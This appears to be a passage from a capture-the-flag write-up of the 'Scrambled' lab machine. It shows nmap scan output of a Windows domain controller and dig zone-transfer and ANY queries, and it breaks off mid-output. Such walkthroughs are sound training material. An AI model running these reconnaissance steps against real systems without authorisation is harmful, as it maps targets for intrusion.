---
layout: default
---

# Scrambled

# Enumeration

IP → 10.10.11.168

Open ports

```bash
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
1433/tcp  open  ms-sql-s         syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
4411/tcp  open  found            syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
49667/tcp open  unknown          syn-ack
49675/tcp open  unknown          syn-ack
49676/tcp open  unknown          syn-ack
49688/tcp open  unknown          syn-ack
49734/tcp open  unknown          syn-ack
```

```bash
PORT     STATE SERVICE       REASON  VERSION
53/tcp   open  domain        syn-ack Simple DNS Plus
80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Scramble Corp Intranet
88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2023-12-23 09:43:32Z)
135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2023-12-23T09:46:40+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-12-23T09:29:41
| Not valid after:  2024-12-22T09:29:41
| MD5:   f6e0:f2c6:2a63:9374:5855:6e96:192d:2944
| SHA-1: a08e:9161:9b7f:0bdd:062c:529c:428c:bd1b:a956:f3e8
| -----BEGIN CERTIFICATE-----
| MIIGHDCCBQSgAwIBAgITEgAAAAPz9p7Zjdo4+gAAAAAAAzANBgkqhkiG9w0BAQUF
| ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt
| MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAeFw0yMzEyMjMwOTI5NDFaFw0yNDEyMjIw
| OTI5NDFaMBkxFzAVBgNVBAMTDkRDMS5zY3JtLmxvY2FsMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAyt7AH1lVEKQnFLSuz8tUf93b8Ua28pfp1G7pVMSd
| nbxSa2L1EbmDqTBFqvj2+4/ZR1UPUgT9A0vHu46mXX95lOYz8kVyPV7H0C+/Bd3t
| lZ9+8wSMWh0kH2s93QGwS6qxGnktGm2jZVy5nPe4uSCzZwAdHi6IiyMPI7COePYt
| Z6RiFyYWbhI2UxdHflQkCe8NavNvOuhMN7QVOUtndidSVWDYyRY3G6BseTMMwXJ7
| nDIa2nTmdXlmFXChfu0JpveAkXQd3PGnidHVKp6J/qphBiXU7w32QmD4HownkhBt
| WFEVddmZdAWQr28e6BVH9h30LF3iwYtburSIlvcte1wPuQIDAQABo4IDMTCCAy0w
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUmBPw4qcCqyP5Jvrr
| bPkA1ZeZT0YwHwYDVR0jBBgwFoAUCGlCGQotn3BwNjRGHOcdhhWbaJIwgcQGA1Ud
| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2NybS1EQzEtQ0EsQ049REMx
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZv
| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
| MIG8BggrBgEFBQcBAQSBrzCBrDCBqQYIKwYBBQUHMAKGgZxsZGFwOi8vL0NOPXNj
| cm0tREMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T
| ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y0FDZXJ0
| aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkw
| OgYDVR0RBDMwMaAfBgkrBgEEAYI3GQGgEgQQZxIub1TYH0SkXtctiXUFOYIOREMx
| LnNjcm0ubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
| MS01LTIxLTI3NDMyMDcwNDUtMTgyNzgzMTEwNS0yNTQyNTIzMjAwLTEwMDAwDQYJ
| KoZIhvcNAQEFBQADggEBAHyH1IxhTwLco+6pi1xIVwVufUTShbXCKnSBobjCcjHx
| bdCAQBi6v+V/7h71SbDSRir76aa2XKEeR908w0TWiI0EBa2jxQdrj5w9+F3Bms7K
| lF0KD1/WYQ9vrAcVCtydtskyHwcRRIw1wduYSBmC4culZH/06PKqbF7slNOk1hif
| BUN5ovgIDblKJj9Xz5jcrosDqrHwe3odE10z6dGMWGhEbAGfjFhT2nw64EkCdx8D
| p50QfMFJyk/5MEawxw0w32gCwGJP4UJ2fDVs2UJn87GG6Fbmx1NPEB59YIwH9gBP
| 7zhNLYPlZRc523W7EZBtKr4AiwdYRqVhmd9+CC9IfBI=
|_-----END CERTIFICATE-----
445/tcp  open  microsoft-ds? syn-ack
464/tcp  open  kpasswd5?     syn-ack
593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-12-23T09:29:41
| Not valid after:  2024-12-22T09:29:41
| MD5:   f6e0:f2c6:2a63:9374:5855:6e96:192d:2944
| SHA-1: a08e:9161:9b7f:0bdd:062c:529c:428c:bd1b:a956:f3e8
| -----BEGIN CERTIFICATE-----
| MIIGHDCCBQSgAwIBAgITEgAAAAPz9p7Zjdo4+gAAAAAAAzANBgkqhkiG9w0BAQUF
| ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt
| MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAeFw0yMzEyMjMwOTI5NDFaFw0yNDEyMjIw
| OTI5NDFaMBkxFzAVBgNVBAMTDkRDMS5zY3JtLmxvY2FsMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAyt7AH1lVEKQnFLSuz8tUf93b8Ua28pfp1G7pVMSd
| nbxSa2L1EbmDqTBFqvj2+4/ZR1UPUgT9A0vHu46mXX95lOYz8kVyPV7H0C+/Bd3t
| lZ9+8wSMWh0kH2s93QGwS6qxGnktGm2jZVy5nPe4uSCzZwAdHi6IiyMPI7COePYt
| Z6RiFyYWbhI2UxdHflQkCe8NavNvOuhMN7QVOUtndidSVWDYyRY3G6BseTMMwXJ7
| nDIa2nTmdXlmFXChfu0JpveAkXQd3PGnidHVKp6J/qphBiXU7w32QmD4HownkhBt
| WFEVddmZdAWQr28e6BVH9h30LF3iwYtburSIlvcte1wPuQIDAQABo4IDMTCCAy0w
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUmBPw4qcCqyP5Jvrr
| bPkA1ZeZT0YwHwYDVR0jBBgwFoAUCGlCGQotn3BwNjRGHOcdhhWbaJIwgcQGA1Ud
| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2NybS1EQzEtQ0EsQ049REMx
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZv
| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
| MIG8BggrBgEFBQcBAQSBrzCBrDCBqQYIKwYBBQUHMAKGgZxsZGFwOi8vL0NOPXNj
| cm0tREMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T
| ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y0FDZXJ0
| aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkw
| OgYDVR0RBDMwMaAfBgkrBgEEAYI3GQGgEgQQZxIub1TYH0SkXtctiXUFOYIOREMx
| LnNjcm0ubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
| MS01LTIxLTI3NDMyMDcwNDUtMTgyNzgzMTEwNS0yNTQyNTIzMjAwLTEwMDAwDQYJ
| KoZIhvcNAQEFBQADggEBAHyH1IxhTwLco+6pi1xIVwVufUTShbXCKnSBobjCcjHx
| bdCAQBi6v+V/7h71SbDSRir76aa2XKEeR908w0TWiI0EBa2jxQdrj5w9+F3Bms7K
| lF0KD1/WYQ9vrAcVCtydtskyHwcRRIw1wduYSBmC4culZH/06PKqbF7slNOk1hif
| BUN5ovgIDblKJj9Xz5jcrosDqrHwe3odE10z6dGMWGhEbAGfjFhT2nw64EkCdx8D
| p50QfMFJyk/5MEawxw0w32gCwGJP4UJ2fDVs2UJn87GG6Fbmx1NPEB59YIwH9gBP
| 7zhNLYPlZRc523W7EZBtKr4AiwdYRqVhmd9+CC9IfBI=
|_-----END CERTIFICATE-----
|_ssl-date: 2023-12-23T09:46:40+00:00; -1s from scanner time.
1433/tcp open  ms-sql-s      syn-ack Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.10.11.168:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2023-12-23T09:46:40+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-12-23T09:39:42
| Not valid after:  2053-12-23T09:39:42
| MD5:   37c1:b423:8ce9:09c7:b97f:8c28:31ba:c281
| SHA-1: 59d2:ae05:7f6a:223f:719a:a439:0222:5bc7:babd:6be0
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQGAy0WZke0K9HhquT/48r4DANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjMxMjIzMDkzOTQyWhgPMjA1MzEyMjMwOTM5NDJaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAK+3nWlN
| OLzBw5s4aA33JBb2aO3VSoKm0hjDfUUgDRTH/OtnXS45T4a7kdFz0DhWXrB5theO
| nj5F3De1zK++VF2TcJumKWNGCPLURGLINDngfLV7fgFIpIueq+D7MR+a9zxCQ+Ji
| nO5N1tVIQxLo5Zh7j6xLN6XG4MXemk/KxSty0aRYyIcDEPJrimRxPg16wj3FU+ul
| iHkAzIEzM5ueFU3ZFMKHuzTGVT2Ur9ykdjPKyUM29P9OVwTxON46BHCQTs/mUIdS
| eFKBZaNqus0kmsE8iRddbe8t9VX4gl40fgCcH8yjxH+4p7Cb+BaUdV5R8MN7lWgS
| mZZLQC/duIayOIECAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAFr6lK/y/s3NHPQvc
| tT8BYtYwqBIs+aQRIHxU4ln1MzqD3lAYb6dPAOArLmzj8yBFy0j8NHdHwz3stw9/
| P0HUuihLvgFSay7imZP4xEKf0D/0LtdrMOR8awgkSQWOau58EBdBYbCGyyOTb5W5
| ht7Z0VNDIve3bfHGXRf/2vaEGgxd2xY1a0SFZhENcrm6tsDNVKgKWNjqgYgsm6u5
| 56V2U0mOXb7pXb59VEppEW4BW+rr8tkC57XlcTTOcKHmN5pMj1k7TTn6/E2kY1DR
| ibepAR49TIPavgqnhnelDG3epdFtaF420fW5EQNdjNYjU/gNPrTsS3o2a4869pdm
| v1VVzw==
|_-----END CERTIFICATE-----
3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: scrm.dc1.scrm.local-
| MIIGHDCCBQSgAwIBAgITEgAAAAPz9p7Zjdo4+gAAAAAAAzANBgkqhkiG9w0BAQUF
| ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt
| MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAeFw0yMzEyMjMwOTI5NDFaFw0yNDEyMjIw
| OTI5NDFaMBkxFzAVBgNVBAMTDkRDMS5zY3JtLmxvY2FsMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAyt7AH1lVEKQnFLSuz8tUf93b8Ua28pfp1G7pVMSd
| nbxSa2L1EbmDqTBFqvj2+4/ZR1UPUgT9A0vHu46mXX95lOYz8kVyPV7H0C+/Bd3t
| lZ9+8wSMWh0kH2s93QGwS6qxGnktGm2jZVy5nPe4uSCzZwAdHi6IiyMPI7COePYt
| Z6RiFyYWbhI2UxdHflQkCe8NavNvOuhMN7QVOUtndidSVWDYyRY3G6BseTMMwXJ7
| nDIa2nTmdXlmFXChfu0JpveAkXQd3PGnidHVKp6J/qphBiXU7w32QmD4HownkhBt
| WFEVddmZdAWQr28e6BVH9h30LF3iwYtburSIlvcte1wPuQIDAQABo4IDMTCCAy0w
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUmBPw4qcCqyP5Jvrr
| bPkA1ZeZT0YwHwYDVR0jBBgwFoAUCGlCGQotn3BwNjRGHOcdhhWbaJIwgcQGA1Ud
| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2NybS1EQzEtQ0EsQ049REMx
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZv
| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
| MIG8BggrBgEFBQcBAQSBrzCBrDCBqQYIKwYBBQUHMAKGgZxsZGFwOi8vL0NOPXNj
| cm0tREMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T
| ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y0FDZXJ0
| aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkw
| OgYDVR0RBDMwMaAfBgkrBgEEAYI3GQGgEgQQZxIub1TYH0SkXtctiXUFOYIOREMx
| LnNjcm0ubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
| MS01LTIxLTI3NDMyMDcwNDUtMTgyNzgzMTEwNS0yNTQyNTIzMjAwLTEwMDAwDQYJ
| KoZIhvcNAQEFBQADggEBAHyH1IxhTwLco+6pi1xIVwVufUTShbXCKnSBobjCcjHx
| bdCAQBi6v+V/7h71SbDSRir76aa2XKEeR908w0TWiI0EBa2jxQdrj5w9+F3Bms7K
| lF0KD1/WYQ9vrAcVCtydtskyHwcRRIw1wduYSBmC4culZH/06PKqbF7slNOk1hif
| BUN5ovgIDblKJj9Xz5jcrosDqrHwe3odE10z6dGMWGhEbAGfjFhT2nw64EkCdx8D
| p50QfMFJyk/5MEawxw0w32gCwGJP4UJ2fDVs2UJn87GG6Fbmx1NPEB59YIwH9gBP
| 7zhNLYPlZRc523W7EZBtKr4AiwdYRqVhmd9+CC9IfBI=
|_-----END CERTIFICATE-----
|_ssl-date: 2023-12-23T09:46:40+00:00; -1s from scanner time.
3269/tcp open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2023-12-23T09:46:40+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-12-23T09:29:41
| Not valid after:  2024-12-22T09:29:41
| MD5:   f6e0:f2c6:2a63:9374:5855:6e96:192d:2944
| SHA-1: a08e:9161:9b7f:0bdd:062c:529c:428c:bd1b:a956:f3e8
| -----BEGIN CERTIFICATE-----
| MIIGHDCCBQSgAwIBAgITEgAAAAPz9p7Zjdo4+gAAAAAAAzANBgkqhkiG9w0BAQUF
| ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt
| MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAeFw0yMzEyMjMwOTI5NDFaFw0yNDEyMjIw
| OTI5NDFaMBkxFzAVBgNVBAMTDkRDMS5zY3JtLmxvY2FsMIIBIjANBgkqhkiG9w0B
| AQEFAAOCAQ8AMIIBCgKCAQEAyt7AH1lVEKQnFLSuz8tUf93b8Ua28pfp1G7pVMSd
| nbxSa2L1EbmDqTBFqvj2+4/ZR1UPUgT9A0vHu46mXX95lOYz8kVyPV7H0C+/Bd3t
| lZ9+8wSMWh0kH2s93QGwS6qxGnktGm2jZVy5nPe4uSCzZwAdHi6IiyMPI7COePYt
| Z6RiFyYWbhI2UxdHflQkCe8NavNvOuhMN7QVOUtndidSVWDYyRY3G6BseTMMwXJ7
| nDIa2nTmdXlmFXChfu0JpveAkXQd3PGnidHVKp6J/qphBiXU7w32QmD4HownkhBt
| WFEVddmZdAWQr28e6BVH9h30LF3iwYtburSIlvcte1wPuQIDAQABo4IDMTCCAy0w
| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUmBPw4qcCqyP5Jvrr
| bPkA1ZeZT0YwHwYDVR0jBBgwFoAUCGlCGQotn3BwNjRGHOcdhhWbaJIwgcQGA1Ud
| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2NybS1EQzEtQ0EsQ049REMx
| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZv
| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
| MIG8BggrBgEFBQcBAQSBrzCBrDCBqQYIKwYBBQUHMAKGgZxsZGFwOi8vL0NOPXNj
| cm0tREMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T
| ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y0FDZXJ0
| aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkw
| OgYDVR0RBDMwMaAfBgkrBgEEAYI3GQGgEgQQZxIub1TYH0SkXtctiXUFOYIOREMx
| LnNjcm0ubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
| MS01LTIxLTI3NDMyMDcwNDUtMTgyNzgzMTEwNS0yNTQyNTIzMjAwLTEwMDAwDQYJ
| KoZIhvcNAQEFBQADggEBAHyH1IxhTwLco+6pi1xIVwVufUTShbXCKnSBobjCcjHx
| bdCAQBi6v+V/7h71SbDSRir76aa2XKEeR908w0TWiI0EBa2jxQdrj5w9+F3Bms7K
| lF0KD1/WYQ9vrAcVCtydtskyHwcRRIw1wduYSBmC4culZH/06PKqbF7slNOk1hif
| BUN5ovgIDblKJj9Xz5jcrosDqrHwe3odE10z6dGMWGhEbAGfjFhT2nw64EkCdx8D
| p50QfMFJyk/5MEawxw0w32gCwGJP4UJ2fDVs2UJn87GG6Fbmx1NPEB59YIwH9gBP
| 7zhNLYPlZRc523W7EZBtKr4AiwdYRqVhmd9+CC9IfBI=
|_-----END CERTIFICATE-----
4411/tcp open  found?        syn-ack
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        syn-ack .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4411-TCP:V=7.94SVN%I=7%D=12/23%Time=6586ABC5%P=x86_64-pc-linux-gnu%
SF:r(NULL,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GenericLines,1D,"SCRAM
SF:BLECORP_ORDERS_V1\.0\.3;\r\n")%r(GetRequest,35,"SCRAMBLECORP_ORDERS_V1\
SF:.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(HTTPOptions,35,"SCRAMBLECORP_O
SF:RDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RTSPRequest,35,"SCRAM
SF:BLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RPCCheck,1D,
SF:"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSVersionBindReqTCP,1D,"SCRAMBL
SF:ECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSStatusRequestTCP,1D,"SCRAMBLECORP_ORD
SF:ERS_V1\.0\.3;\r\n")%r(Help,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_U
SF:NKNOWN_COMMAND;\r\n")%r(SSLSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;
SF:\r\n")%r(TerminalServerCookie,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r
SF:(TLSSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Kerberos,1D,"S
SF:CRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SMBProgNeg,1D,"SCRAMBLECORP_ORDERS
SF:_V1\.0\.3;\r\n")%r(X11Probe,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(F
SF:ourOhFourRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COM
SF:MAND;\r\n")%r(LPDString,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKN
SF:OWN_COMMAND;\r\n")%r(LDAPSearchReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\
SF:n")%r(LDAPBindReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SIPOptions,
SF:35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(LAN
SF:Desk-RC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TerminalServer,1D,"SC
SF:RAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(NCP,1D,"SCRAMBLECORP_ORDERS_V1\.0\.
SF:3;\r\n")%r(NotesRPC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(JavaRMI,1
SF:D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(WMSRequest,1D,"SCRAMBLECORP_OR
SF:DERS_V1\.0\.3;\r\n")%r(oracle-tns,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n
SF:")%r(ms-sql-s,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(afp,1D,"SCRAMBL
SF:ECORP_ORDERS_V1\.0\.3;\r\n")%r(giop,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r
SF:\n");
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-12-23T09:46:01
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 42300/tcp): CLEAN (Timeout)
|   Check 2 (port 24370/tcp): CLEAN (Timeout)
|   Check 3 (port 31813/udp): CLEAN (Timeout)
|   Check 4 (port 59655/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 0s, deviation: 0s, median: -1s
```

We cannot identify the domain using crackmapexec but instead, nmap will report the domain through LDAP.

### Port 53

- DNS
- NO transfer zone available

```bash
┌──(kali㉿kali)-[~/machines/windows/scrambled/enumeration]
└─$ dig axfr scrm.local @10.10.11.168

; <<>> DiG 9.19.17-2~kali1-Kali <<>> axfr scrm.local @10.10.11.168
;; global options: +cmd
; Transfer failed.
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/machines/windows/scrambled/enumeration]
└─$ dig ANY scrm.local @10.10.11.168 

; <<>> DiG 9.19.17-2~kali1-Kali <<>> ANY scrm.local @10.10.11.168
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 31756
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
